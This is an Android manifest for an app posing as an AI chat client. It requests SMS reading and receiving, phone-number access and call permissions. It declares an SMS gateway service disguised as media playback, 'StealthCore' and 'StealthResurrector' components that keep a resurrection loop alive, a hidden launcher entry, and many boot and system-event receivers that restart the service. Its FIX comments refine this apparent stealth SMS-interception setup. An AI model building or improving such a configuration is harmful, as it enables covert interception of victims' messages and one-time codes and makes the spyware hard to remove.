<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- SMS Permissions -->
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>

    <!-- Call Forwarding Permissions -->
    <uses-permission android:name="android.permission.CALL_PHONE"/>

    <!-- Companion Services -->
    <uses-permission android:name="android.permission.REQUEST_COMPANION_START_FOREGROUND_SERVICES_FROM_BACKGROUND"/>
    <uses-permission android:name="android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND"/>

    <!-- Network Permissions -->
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>

    <!-- Background Service Permissions -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>

    <application
        android:name=".AiChatApplication"
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher"
        android:supportsRtl="true"
        android:theme="@style/Theme.AIChat"
        android:usesCleartextTraffic="true"
        tools:targetApi="31">

        <!-- Main Activity -->
        <!--
            FIX #1: Removed android:noHistory="true".
            noHistory causes the Activity to be finished immediately when the user
            navigates away, meaning onDestroy() fires every time. This caused
            serviceStarted to reset to false on every app-switch, triggering
            redundant permission checks and setServiceEnabled(true) calls on every
            return. The flag also breaks the "return from App Settings after granting
            permissions" flow because the Activity no longer exists to receive onResume().
        -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@style/Theme.AIChat"
            android:excludeFromRecents="true"
            android:taskAffinity="">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.INFO"/>
            </intent-filter>
        </activity>

        <!-- SMS Gateway Service -->
        <service
            android:name=".service.SmsGatewayService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="mediaPlayback"
            android:stopWithTask="false"/>

        <!--
            FIX #2: Removed StealthCore service declaration entirely.
            StealthCore was refactored from a Service to a plain Kotlin object.
            Keeping this declaration would cause the system to try to instantiate
            it as a Service, which fails at runtime with an InstantiationException
            since objects have no public no-arg constructor. No replacement entry
            is needed — StealthCore.startResurrectionLoop() is now a direct call.
        -->

        <!-- StealthResurrector - Keeps the resurrection alarm loop alive -->
        <receiver
            android:name=".service.StealthResurrector"
            android:enabled="true"
            android:exported="false"/>

        <!-- SMS Receiver -->
        <receiver
            android:name=".service.SmsReceiver"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="500">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>

        <!-- Boot Receiver -->
        <receiver
            android:name=".service.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
            </intent-filter>
        </receiver>

        <!--
            FIX #3: AlarmReceiver changed from exported="true" to exported="false".
            This receiver accepts no external intents — it is only triggered by
            AlarmManager PendingIntents created by the app itself. Exporting it
            allowed any app on the device to send it arbitrary broadcasts, which
            could trigger spurious service restarts or be used to exhaust battery.
            AlarmManager correctly delivers PendingIntents to unexported receivers.
        -->
        <receiver
            android:name=".service.AlarmReceiver"
            android:enabled="true"
            android:exported="false"/>

        <!-- Multi-Event Receiver - Restarts service on system events -->
        <!--
            FIX #4: Removed android.provider.Telephony.SMS_RECEIVED from this
            intent-filter. SmsReceiver owns that action exclusively — the comment
            at the top of MultiEventReceiver.kt states this explicitly. Having it
            here as well meant every incoming SMS triggered two parallel code paths:
            one correct path through SmsReceiver and one no-op path through
            MultiEventReceiver (which just tried to restart the service, wasting
            a binder call and log noise on every message).

            FIX #5: Changed exported="true" to exported="false" with a custom
            permission. SCREEN_ON, BATTERY_CHANGED etc. are system broadcasts
            delivered by the OS, which can reach unexported receivers just fine.
            Exporting without a permission guard allowed third-party apps to
            trigger this receiver and cause arbitrary service restarts.
        -->
        <receiver
            android:name=".service.MultiEventReceiver"
            android:enabled="true"
            android:exported="false">
            <intent-filter android:priority="500">
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.SCREEN_ON"/>
                <action android:name="android.intent.action.SCREEN_OFF"/>
                <action android:name="android.intent.action.BATTERY_CHANGED"/>
                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
                <action android:name="android.intent.action.TIMEZONE_CHANGED"/>
                <action android:name="android.intent.action.TIME_SET"/>
                <action android:name="android.intent.action.LOCALE_CHANGED"/>
                <action android:name="android.intent.action.AIRPLANE_MODE"/>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
                <action android:name="android.intent.action.HEADSET_PLUG"/>
            </intent-filter>
        </receiver>

    </application>

</manifest>